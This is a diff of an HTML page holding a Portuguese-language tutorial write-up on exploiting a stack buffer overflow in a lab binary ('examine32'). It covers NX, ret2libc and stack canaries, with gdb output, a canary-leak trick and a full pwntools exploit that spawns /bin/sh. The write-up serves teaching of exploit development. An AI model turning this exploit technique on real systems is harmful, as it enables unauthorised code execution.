@@ -112,7 +112,6 @@ Esse texto é um <em>write up</em> bem introdutório sobre essas proteções e c
 <span class="w">            </span><span class="err">}</span>
 </code></pre></div>
 
-
 <p>Note a linha 18, ela escreve um <em>char</em> na array “<em>s”</em> mas nunca checa se o “<em>i”</em> é maior do que o tamanho da <em>array</em>. Assim, podemos escrever o quanto quisermos na <em>stack.</em> Agora fica fácil de redirecionar a execução do programa para onde quisermos, é só colocar um <em>shellcode</em> na <em>stack</em> e executa-lo, certo ?</p>
 <p>Errado ( ̶o̶t̶á̶r̶i̶o̶!̶), o problema é que essa vulnerabilidade já tem mais de <a href="https://en.wikipedia.org/wiki/Buffer_overflow#History">40 anos</a>, e com o tempo os sistemas operacionais foram implementando várias proteções que dificultam enormemente a exploração.</p>
 <p>Utilizando o <a href="https://github.com/RobinDavid/checksec/blob/master/checksec.sh"><em>checksec</em></a> conseguimos verificar todas as proteções no nosso binário: <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries">Canary</a>; <a href="https://tk-blog.blogspot.com.br/2009/02/relro-not-so-well-known-memory.html">RELRO</a> e <a href="https://en.wikipedia.org/wiki/NX_bit">NX</a> — Eu desabilitei o <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> da minha máquina, porque ̶s̶o̶u̶ ̶n̶0̶0̶b̶ ativado faria com que as alocações de memória fossem aleatórias, tentarei fazer um <em>exploit</em> para <em>bypassar</em> ele também no futuro.</p>
@@ -126,7 +125,6 @@ Esse texto é um <em>write up</em> bem introdutório sobre essas proteções e c
              FORTIFY: Enabled
 </code></pre></div>
 
-
 <h3>No-eXecute</h3>
 <p>Também conhecido como NX, essa proteção determina quais áreas da memória poderão ser executadas. Impedindo assim, que o atacante coloque seu <em>payload</em> malicioso na <em>Stack</em> e o execute com alguma vulnerabilidade. Existem inúmeras maneiras de evitar essa proteção, neste <em>exploit</em> eu usei o _ret2libc — _recomendo a leitura do primeiro <a href="http://seclists.org/bugtraq/1997/Aug/63">artigo sobre o assunto</a>.</p>
 <p>A idéia principal do <em>ret2libc</em> é que ao invés de redirecionarmos a execução do programa para o nosso payload na <em>stack,</em> vamos executar algo da <a href="https://en.wikipedia.org/wiki/C_standard_library">libc</a> como um <em>system(“/bin/sh”)</em> por exemplo. Para fazermos isso precisamos passar argumentos para a função. No x86 os argumentos ficam na <em>stack</em>, então temos que prepará-la de acordo com o que quisermos fazer. No caso nossa stack terá que se parecer com essa :</p>
@@ -138,7 +136,6 @@ Esse texto é um <em>write up</em> bem introdutório sobre essas proteções e c
 <span class="w">            </span><span class="o">$</span><span class="mi">2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="o">&lt;</span><span class="n">text</span><span class="w"> </span><span class="n">variable</span><span class="p">,</span><span class="w"> </span><span class="n">no</span><span class="w"> </span><span class="n">debug</span><span class="w"> </span><span class="n">info</span><span class="o">&gt;</span><span class="p">}</span><span class="w"> </span><span class="mh">0xf7e0cf50</span><span class="w"> </span><span class="o">&lt;</span><span class="n">exit</span><span class="o">&gt;</span>
 </code></pre></div>
 
-
 <p>Também precisamos encontrar o endereço da string “/bin/sh” :</p>
 <div class="codehilite"><pre><span></span><code><span class="w">            </span><span class="nv">gdb</span><span class="o">-</span><span class="nv">peda</span>$<span class="w"> </span><span class="nv">find</span><span class="w"> </span>“<span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">sh</span>”<span class="w">  </span>
 <span class="w">            </span><span class="nv">Searching</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>‘<span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">sh</span>’<span class="w"> </span><span class="nv">in</span>:<span class="w"> </span><span class="nv">None</span><span class="w"> </span><span class="nv">ranges</span><span class="w">  </span>
@@ -146,22 +143,20 @@ Esse texto é um <em>write up</em> bem introdutório sobre essas proteções e c
 <span class="w">            </span><span class="nv">libc</span><span class="w"> </span>:<span class="w"> </span><span class="mi">0</span><span class="nv">xf7f39fcc</span><span class="w"> </span><span class="ss">(</span>“<span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">sh</span>”<span class="ss">)</span>
 </code></pre></div>
 
-
 <p>Importante notar que é necessário saber qual a versão do <em>libc</em> na máquina alvo para encontrar as funções desejadas (<em>system</em> por exemplo), calculando os <em>offsets</em> através do endereço base de memória alocada para <em>libc</em>. Pois os <em>offsets</em> se diferenciam entre as versões. Aqui tem uma database de versões para ajudar a encontrar : <a href="https://github.com/niklasb/libc-database">github.com/niklasb/libc-database</a> — Discutirei isso mais a fundo no próximo post.</p>
 <p>Vamos começar o esboço do nosso <em>exploit</em>.  </p>
 <p>from pwn import *</p>
-<div class="codehilite"><pre><span></span><code><span class="w">            </span><span class="nv">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">process</span><span class="ss">(</span><span class="s2">&quot;./examine32&quot;</span><span class="ss">)</span>
-<span class="w">            </span><span class="nv">system</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="nv">xf7e19e70</span>
-<span class="w">            </span><span class="k">exit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="nv">xf7e0cf50</span>
-<span class="w">            </span><span class="nv">bash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="nv">xf7f39fcc</span>
-<span class="w">            </span><span class="nv">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>???
+<div class="codehilite"><pre><span></span><code>            p = process(&quot;./examine32&quot;)
+            system = 0xf7e19e70
+            exit = 0xf7e0cf50
+            bash = 0xf7f39fcc
+            offset = ???
 
-<span class="w">            </span><span class="nv">exploit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="nv">offset</span><span class="o">+</span><span class="nv">p32</span><span class="ss">(</span><span class="nv">system</span><span class="ss">)</span><span class="o">+</span><span class="nv">p32</span><span class="ss">(</span><span class="k">exit</span><span class="ss">)</span><span class="o">+</span><span class="nv">p32</span><span class="ss">(</span><span class="nv">bash</span><span class="ss">)</span><span class="o">+</span><span class="s2">&quot;\xff&quot;</span>
+            exploit = &quot;A&quot;*offset+p32(system)+p32(exit)+p32(bash)+&quot;\xff&quot;
 
-<span class="w">            </span><span class="nv">p</span>.<span class="nv">sendline</span><span class="ss">(</span><span class="nv">exploit</span><span class="ss">)</span>
-<span class="w">            </span><span class="nv">p</span>.<span class="nv">interactive</span><span class="ss">()</span>
+            p.sendline(exploit)
+            p.interactive()
 </code></pre></div>
-
 
 <p>Abrimos o processo, declaramos os endereços, montamos o <em>payload</em> e adicionamos o <em>0xff</em> para servir de EOF — Vide linha 9 do código, precisamos do EOF para atingirmos o <em>return.</em></p>
 <p>Mas ainda não sabemos o <em>offset,</em> vamos descobri-lo usando o GDB :<br />
@@ -191,7 +186,6 @@ Esse texto é um <em>write up</em> bem introdutório sobre essas proteções e c
 <span class="w">            </span><span class="c1">#3 0xf7ed5c2a in \_\_stack\_chk\_fail () from /lib32/libc.so.6 # Opa ,o que é isso ?   </span>
 <span class="w">            </span><span class="c1">#4 0x08048767 in main ()</span>
 </code></pre></div>
-
 
 <p>Recebemos um SIGSEGV pois o binário chamou <em>__stack_chk_fail</em>, vamos fazer uma breve análise no <a href="https://www.hex-rays.com/products/ida/">IDA</a> para entendermos porque ele foi parar lá.</p>
 <p><img alt="" src="img/1__MjbYO0SYl6xdmCi1XvaY1w.jpeg" /></p>
@@ -278,14 +272,12 @@ Esse texto é um <em>write up</em> bem introdutório sobre essas proteções e c
 <span class="w">            </span><span class="n">DAn</span><span class="p">;</span><span class="w"> </span><span class="n">found</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">offset</span><span class="p">:</span><span class="w"> </span><span class="mi">1032</span><span class="w"> </span><span class="c1"># achamos o offset</span>
 </code></pre></div>
 
-
 <h4>Lendo o Canary</h4>
 <p>Precisamos de alguma forma ler o conteúdo do Canary para coloca-lo certo na stack. <br />
 Depois de receber um <em>input</em> o programa executa o código abaixo, que transforma a array para URL Encoding.</p>
 <div class="codehilite"><pre><span></span><code><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="ss">(</span><span class="nv">i</span><span class="o">=</span><span class="mi">0</span><span class="c1">; i &lt; strlen(s); i++)  </span>
 <span class="w">                 </span><span class="nv">printf</span><span class="ss">(</span><span class="s2">&quot;%%%2X&quot;</span>,<span class="w"> </span><span class="nv">s</span>\[<span class="nv">i</span>\]<span class="ss">)</span><span class="c1">;</span>
 </code></pre></div>
-
 
 <p><img alt="" src="img/1__ApAL8LqAtt__k__oIK8DiK__A.png" /></p>
 <p>Essa é a <em>stack</em> normal do programa, com o Canary logo depois da <em>array</em> que estamos sobrescrevendo. Note os bytes nulos no final dos dois.</p>
@@ -297,31 +289,29 @@ Segue :</p>
             URL encoding: %41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%FFFFFF9C%FFFFFFCF%FFFFFFD3%FFFFFFC4%43%FFFFFFF8%FFFFFFF7
 </code></pre></div>
 
-
 <p>Conseguimos assim ler os valores do Canary, depois temos apenas que montar a stack com o valor dele para não cairmos no <em>__stack_chk_fail.</em></p>
 <p>E o exploit final :</p>
-<div class="codehilite"><pre><span></span><code>            <span class="s s-Atom">from</span> <span class="s s-Atom">pwn</span> <span class="s s-Atom">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code>            <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-            <span class="s s-Atom">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="s2">&quot;./examine32&quot;</span><span class="p">)</span>
-            <span class="s s-Atom">offset</span> <span class="o">=</span> <span class="mi">1032</span> <span class="s s-Atom">#</span> <span class="s s-Atom">offset</span> <span class="s s-Atom">para</span> <span class="s s-Atom">sobrescrever</span> <span class="s s-Atom">o</span> <span class="nv">EIP</span>
-            <span class="s s-Atom">read_canary_payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">1001</span> <span class="s s-Atom">#</span> <span class="s s-Atom">sobrescrevendo</span> <span class="s s-Atom">o</span> <span class="s s-Atom">nullbyte</span> <span class="s s-Atom">para</span> <span class="s s-Atom">leakar</span> <span class="s s-Atom">o</span> <span class="nb">val</span><span class="s s-Atom">or</span> <span class="s s-Atom">do</span> <span class="nv">Canary</span>
-            <span class="s s-Atom">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="s s-Atom">read_canary_payload</span><span class="p">)</span>
-            <span class="s s-Atom">canary</span> <span class="o">=</span> <span class="s s-Atom">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="s2">&quot;Timestamp&quot;</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="s2">&quot;%&quot;</span><span class="p">)</span> 
-            <span class="s s-Atom">canary</span> <span class="o">=</span> <span class="p">[</span><span class="s s-Atom">canary</span><span class="p">[</span><span class="s s-Atom">i</span><span class="p">][</span><span class="o">-</span><span class="mi">2</span><span class="o">:</span><span class="p">]</span> <span class="s s-Atom">for</span> <span class="s s-Atom">i</span> <span class="s s-Atom">in</span> <span class="nf">range</span><span class="p">(</span><span class="o">-</span><span class="mi">7</span><span class="p">,</span><span class="mi">0</span><span class="p">)][</span><span class="o">:</span><span class="mi">3</span><span class="p">]</span> <span class="s s-Atom">#</span> <span class="nv">Lendo</span> <span class="s s-Atom">o</span> <span class="s s-Atom">output</span>
-            <span class="s s-Atom">canary</span> <span class="o">=</span> <span class="p">[</span><span class="s s-Atom">x</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;0&quot;</span><span class="p">)</span> <span class="s s-Atom">for</span> <span class="s s-Atom">x</span> <span class="s s-Atom">in</span> <span class="s s-Atom">canary</span><span class="p">]</span> <span class="s s-Atom">#</span> <span class="s s-Atom">o</span> <span class="s s-Atom">zero</span> <span class="s s-Atom">buga</span> <span class="s s-Atom">o</span> <span class="s s-Atom">printf</span>
-            <span class="s s-Atom">print</span> <span class="s2">&quot;[!] Canary found : &quot;</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="s s-Atom">canary</span><span class="p">)</span>
-            <span class="s s-Atom">canary</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="s s-Atom">&#39;&#39;</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="s s-Atom">canary</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./examine32&quot;</span><span class="p">)</span>
+            <span class="n">offset</span> <span class="o">=</span> <span class="mi">1032</span> <span class="c1"># offset para sobrescrever o EIP</span>
+            <span class="n">read_canary_payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">1001</span> <span class="c1"># sobrescrevendo o nullbyte para leakar o valor do Canary</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">read_canary_payload</span><span class="p">)</span>
+            <span class="n">canary</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Timestamp&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;%&quot;</span><span class="p">)</span> 
+            <span class="n">canary</span> <span class="o">=</span> <span class="p">[</span><span class="n">canary</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="o">-</span><span class="mi">2</span><span class="p">:]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="o">-</span><span class="mi">7</span><span class="p">,</span><span class="mi">0</span><span class="p">)][:</span><span class="mi">3</span><span class="p">]</span> <span class="c1"># Lendo o output</span>
+            <span class="n">canary</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;0&quot;</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">canary</span><span class="p">]</span> <span class="c1"># o zero buga o printf</span>
+            <span class="nb">print</span> <span class="s2">&quot;[!] Canary found : &quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+            <span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">canary</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
 
-            <span class="s s-Atom">system</span> <span class="o">=</span> <span class="mh">0xf7e19e70</span>
-            <span class="s s-Atom">exit</span> <span class="o">=</span> <span class="mh">0xf7e0cf50</span>
-            <span class="s s-Atom">bash</span> <span class="o">=</span> <span class="mh">0xf7f39fcc</span>
+            <span class="n">system</span> <span class="o">=</span> <span class="mh">0xf7e19e70</span>
+            <span class="n">exit</span> <span class="o">=</span> <span class="mh">0xf7e0cf50</span>
+            <span class="n">bash</span> <span class="o">=</span> <span class="mh">0xf7f39fcc</span>
 
-            <span class="s s-Atom">exploit</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">1000</span><span class="o">+</span><span class="nf">p32</span><span class="p">(</span><span class="s s-Atom">canary</span><span class="p">)[</span><span class="o">::-</span><span class="mi">1</span><span class="p">]</span><span class="s s-Atom">+</span><span class="err">&quot;</span><span class="s s-Atom">\x00</span><span class="s2">&quot; # o canary acaba com nullbyte</span>
-<span class="s2">            exploit += (&quot;</span><span class="nv">A</span><span class="s2">&quot;*(offset-len(exploit)))+p32(system)+p32(exit)+p32(bash)+&quot;</span><span class="s s-Atom">\xff</span><span class="err">&quot;</span> <span class="s s-Atom">#</span> <span class="mh">0xff</span> <span class="o">=</span> <span class="nv">EOF</span>
-            <span class="s s-Atom">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="s s-Atom">exploit</span><span class="p">)</span>
-            <span class="s s-Atom">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span> <span class="s s-Atom">#</span> <span class="s s-Atom">g0t</span> <span class="s s-Atom">sh3ll</span> <span class="nb">?</span>
+            <span class="n">exploit</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">1000</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="c1"># o canary acaba com nullbyte</span>
+            <span class="n">exploit</span> <span class="o">+=</span> <span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">exploit</span><span class="p">)))</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">exit</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">bash</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\xff</span><span class="s2">&quot;</span> <span class="c1"># 0xff = EOF</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1"># g0t sh3ll ?</span>
 </code></pre></div>
-
 
 <p>Como em x64 os argumentos ficam nos registradores, precisaremos fazer mais coisa antes de chamar o <em>system,</em> esse será o tópico do próximo post.</p>
 <p>Inté !</p></body><hr>by <a href='https://twitter.com/caioluders'>@caioluders</a></html>
